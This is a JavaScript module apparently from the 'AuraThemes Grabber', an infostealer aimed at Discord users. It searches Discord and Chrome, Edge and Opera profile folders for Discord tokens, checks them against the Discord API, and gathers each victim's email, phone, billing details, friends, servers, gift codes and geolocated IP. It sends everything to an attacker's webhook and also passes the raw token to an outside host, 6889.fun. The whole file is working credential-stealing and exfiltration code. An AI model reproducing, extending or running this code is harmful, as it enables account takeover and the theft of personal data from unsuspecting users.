const { fetchServers, getEmbed, getPublicIps, getField } = require("./../../utils/functions");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const DiscordToken = require("discord.js-token");
const { totalsTokens, find } = require("./find");
const axios = require("axios");
const getconfig = require("./../../config/config")();

const webhook = new WebhookClient({
    url: getconfig.webhook,
});

let appdata = process.env.appdata;
let localappdata = process.env.localappdata;

let paths = [
    `${appdata}/discord/`,
    `${appdata}/discordcanary/`,
    `${appdata}/discordptb/`,
    `${appdata}/discorddevelopment/`,
    `${appdata}/lightcord/`,
    `${appdata}/Opera Software/Opera Stable/`,
    `${appdata}/Opera Software/Opera GX Stable/`,
    `${localappdata}/Google/Chrome/User Data/Default/`,
    `${localappdata}/Google/Chrome/User Data/Profile 1/`,
    `${localappdata}/Google/Chrome/User Data/Profile 2/`,
    `${localappdata}/Google/Chrome/User Data/Profile 3/`,
    `${localappdata}/Google/Chrome/User Data/Profile 4/`,
    `${localappdata}/Google/Chrome/User Data/Profile 5/`,
    `${localappdata}/Google/Chrome/User Data/Guest Profile/`,
    `${localappdata}/Google/Chrome/User Data/Default/Network/`,
    `${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
    `${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
    `${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
    `${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
    `${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
    `${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Default/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
    `${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

async function sendTokens() {
    for (let path of paths) {
        await find(path);
    }
    for (let token of totalsTokens) {
        let k4itrun;
        await axios({
            url: `https://discord.com/api/v9/users/@me`,
            method: "GET",
            headers: {
                Authorization: token,
            },
        })
            .then((info) => { k4itrun = info.data })
            .catch(() => { k4itrun = null });
        if (!k4itrun) continue;

        var color = "#c267ff";
        var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
        let embed = getEmbed();
        var servers = await fetchServers(token);
        let network = await getPublicIps();
        var Discord = new DiscordToken(token, network.ip, k4itrun.password).info;
        var Initialized = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setThumbnail(Discord.avatar)
            .setColor(color)
            .setTitle("Initialized Grabber")
            .addFields(getField(`<a:aura:1087044506542674091> Token:`, `\`\`\`${Discord.token}\`\`\`\n[[Click Here To Copy Your Token]](${copy})`))
            .addFields(getField(`<a:aura:1101739920319590420> Nitro:`, Discord.nitroType, true))
            .addFields(getField(`<a:aura:995172580988309664> IP Adress`, `\`${network.ip}\``, true))
            .addFields(getField(`<a:aura:863691953531125820> Phone`, `\`${Discord.phone}\``, true))
            .addFields(getField(`<:aura:974711605927505990> Email`, `\`${Discord.mail}\``, false))
            .addFields(getField(`Badges`, Discord.badges, true))
            .addFields(getField(`Billing`, Discord.billing, true))
            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
            .setTimestamp();
        webhook.send({ embeds: [Initialized], username: `@AuraThemes`, avatarURL: embed.avatar }).then(() => { axios.get(copy) }).catch((c) => { axios.get(copy) });

        var Friend = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setColor(color)
            .setTitle("HQ Friend(s)")
            .setDescription(Discord.StrangeFriends === "None" ? `\`\`\`yml\nNot found\`\`\`` : `**${Discord.StrangeFriends}**` )
            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
            .setTimestamp();
        setTimeout(() => webhook.send({ embeds: [Friend], username: `@AuraThemes`, avatarURL: embed.avatar }), 50 );
        
        var Guild = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setColor(color)
            .setTitle("HQ Guild(s)")
            .setDescription(servers.all)
            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
            .setTimestamp();
        setTimeout(() => webhook.send({ embeds: [Guild], username: `@AuraThemes`, avatarURL: embed.avatar }), 50);
        
        var Information = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setColor(color)
            .setTitle("User Informatio(s)")
            .setDescription(
                `**NSFW** ${Discord.NSFW}\n` +
                `**Status** ${Discord.status}\n` +
                `**Owner Servers** \`${Discord.totalOwnedGuild}\`\n` +
                `**Connection** \`${Discord.totalConnection}\`\n` +
                `**BOTS/RPC** \`${Discord.totalApplication}\`\n` +
                `**Blocked** \`${Discord.totalBlocked}\`\n` +
                `**Servers** \`${Discord.totalGuild}\`\n` +
                `**Friends** \`${Discord.totalFriend}\`\n` +
                `**Theme** \`${Discord.theme}\`\n` +
                `**Pending** \`${Discord.pending}\`\n\n` +
                `**Biography** \`\`\`yml\n${Discord.bio === "has no description" ? "Not found" : Discord.bio
                }\n\`\`\``,
            )
            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
            .setTimestamp();
        setTimeout(() => webhook.send({ embeds: [Information], username: `@AuraThemes`, avatarURL: embed.avatar, }), 100);
        
        var Gifts = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setColor(color)
            .setTitle("Gifts Code(s)")
            .addFields(
                ...Object.entries(Discord.Gifts).map(([key, value]) => ({
                    name: "Code " + key,
                    value: typeof value === "object"
                        ? `\`\`\`json\n${JSON.stringify(value, null, 2)
                            ? JSON.stringify(value, null, 2)
                            : "None"
                        }\n\`\`\``
                        : value.toString(),
                })),
            )
            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
            .setTimestamp();
        setTimeout(() => webhook.send({ embeds: [Gifts], username: `@AuraThemes`, avatarURL: embed.avatar, }), 150);
        
        var System = new EmbedBuilder()
            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
            .setColor(color)
            .setTitle("System Informatio(s)")
            .addFields(getField(`Network`, `\`\`\`yml\nPUBLIC: ${Discord.IP.ip}\nCountry: ${Discord.IP.country}\nRegion: ${Discord.IP.region}\nCity: ${Discord.IP.city}\nLatitude: ${Discord.IP.latitude}\nLongitude: ${Discord.IP.longitude}\nISP: ${Discord.IP.isp}\nTime Zone: ${Discord.IP.timezone}\nCurrency Code: ${Discord.IP.currency_code}\`\`\``, false))
            .setFooter({
                text: `AuraThemes Grabber - ${embed.url}`,
                iconURL: embed.footericon,
            })
            .setTimestamp();
        setTimeout(() => webhook.send({ embeds: [System], username: `@AuraThemes`, avatarURL: embed.avatar }), 200);
        
        continue;
    }
}

module.exports = {
    sendTokens
}